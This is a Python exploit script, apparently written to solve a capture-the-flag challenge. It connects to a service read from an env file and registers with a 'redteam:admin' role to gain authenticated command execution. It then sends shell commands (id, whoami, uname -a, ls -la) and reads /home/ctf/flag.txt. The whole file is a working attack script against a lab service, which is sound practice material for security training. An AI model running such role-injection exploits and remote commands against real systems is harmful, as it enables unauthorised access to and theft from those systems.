#!/usr/bin/env python3
import os
import socket
import time
import re


def recv_all(sock: socket.socket, timeout: float = 0.5) -> bytes:
    sock.settimeout(timeout)
    chunks = []
    try:
        while True:
            data = sock.recv(65535)
            if not data:
                break
            chunks.append(data)
            if len(data) < 65535:
                break
    except Exception:
        pass
    return b"".join(chunks)


def send(sock: socket.socket, line: str, delay: float = 0.25) -> bytes:
    if not line.endswith("\n"):
        line += "\n"
    sock.sendall(line.encode())
    time.sleep(delay)
    return recv_all(sock, 0.8)


def load_ip_port() -> tuple[str, int]:
    ip = None
    port = None
    env_path = "/workspace/challenges/khp_instance.env"
    with open(env_path, "r", encoding="utf-8") as f:
        for line in f:
            if line.startswith("IP="):
                ip = line.strip().split("=", 1)[1]
            elif line.startswith("PORT="):
                try:
                    port = int(line.strip().split("=", 1)[1])
                except Exception:
                    pass
    if not ip or not port:
        raise SystemExit("Falta IP/PORT")
    return ip, port


def main() -> None:
    ip, port = load_ip_port()
    with socket.create_connection((ip, port), timeout=5) as s:
        _ = recv_all(s, 0.3)
        r1 = send(s, "REKE redteam:admin")
        rid = 1
        m = re.search(rb"Registered: ID->(\d+)", r1)
        if m:
            rid = int(m.group(1))
        send(s, f"AUTH {rid}")
        out = send(s, "EXEC").decode("utf-8", errors="ignore")
        print(out)
        if "You can run commands now" in out or "/bin/sh" in out or out.strip():
            for cmd in ["id", "whoami", "uname -a", "pwd", "ls -la", "cat /home/ctf/flag.txt", "exit"]:
                s.sendall((cmd + "\n").encode())
                time.sleep(0.5)
                data = recv_all(s, 1.0)
                try:
                    print(data.decode("utf-8", errors="ignore"))
                except Exception:
                    print(repr(data))


if __name__ == "__main__":
    main()

